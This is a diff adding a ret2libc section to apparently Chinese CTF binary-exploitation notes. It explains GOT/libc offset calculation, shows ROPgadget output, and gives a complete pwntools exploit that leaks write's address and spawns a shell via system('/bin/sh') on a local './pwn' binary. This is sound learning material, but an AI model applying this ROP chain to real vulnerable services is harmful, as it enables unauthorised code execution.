@@ -286,6 +286,91 @@ io.interactive()
 
 ## ret2libc
 
+程序system，静态的system与静态的puts的偏移量。
+
+puts加载后再got表的地址（libc中的puts记载到内存的位置），
+
+加载到内存产生的偏移量 = 加载后got地址 - 加载前libc内静态地址
+
+**system动态可调用地址 = 加载内存的偏移量 + 静态的system地址**
+
+puts_adr
+
+system_adr
+
+puts_got
+
+iv = puts_got - puts_adr
+
+system = iv + system_adr
+
+write(write_got)
+
+#### 动调计算偏移
+
+```
+cyclic 200
+cyclic -l esp寄存器内的操作数
+```
+
+![image-20240523142332619](http://image.shangu127.top/img/2024/03/image-20240523142332619.png)
+
+#### 构造泄露gotpayload
+
+![image-20240523142600746](http://image.shangu127.top/img/2024/03/image-20240523142600746.png)
+
+```
+ROPgadget --binary ./pwn --only "pop|ret"
+0x00000000004006b3 : pop rdi ; ret
+0x00000000004006b1 : pop rsi ; pop r15 ; ret
+```
+
+exp:
+
+```python
+from pwn import *
+import pdb
+context(os='linux',arch='amd64',log_level='debug')
+elf = ELF("./pwn")
+libc = ELF("./libc.so.6")
+io = process("./pwn")
+write_adr = libc.symbols['write'] #获取静态write地址
+system_adr = libc.symbols['system'] #获取静态system地址
+main_adr = elf.symbols["main"]
+shell_adr = libc.search(b"/bin/sh").__next__()
+# pdb.set_trace()
+write_got = elf.got["write"]
+write_plt = elf.plt["write"]
+#write_plt(1,write_got,100)
+# ROPgadget --binary ./pwn --only "pop|ret"
+# 0x00000000004006b3 : pop rdi ; ret
+# 0x00000000004006b1 : pop rsi ; pop r15 ; ret
+pop_rdi = 0x4006b3
+pop_rsi_r15 = 0x4006b1
+payload1 = b's'*136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_adr)
+
+io.recvuntil(b":")
+# gdb.attach(io)
+
+# pause()
+io.sendline(payload1)
+io.recvline()
+write_call = u64(io.recv(6).ljust(8,b"\x00")) #接受6个数据，并按照8个一组进行填充，最后解包
+
+print(hex(write_call))
+#计算偏移和加载地址
+iv = write_call - write_adr
+sys_call = iv + system_adr
+shell_call = shell_adr + iv
+payload2 = b's'*136 + p64(pop_rdi) + p64(shell_call) + p64(sys_call)
+
+io.recvuntil(b":")
+io.sendline(payload2)
+io.interactive()
+```
+
+
+
 ## ORW
 
 ## stack_pivot
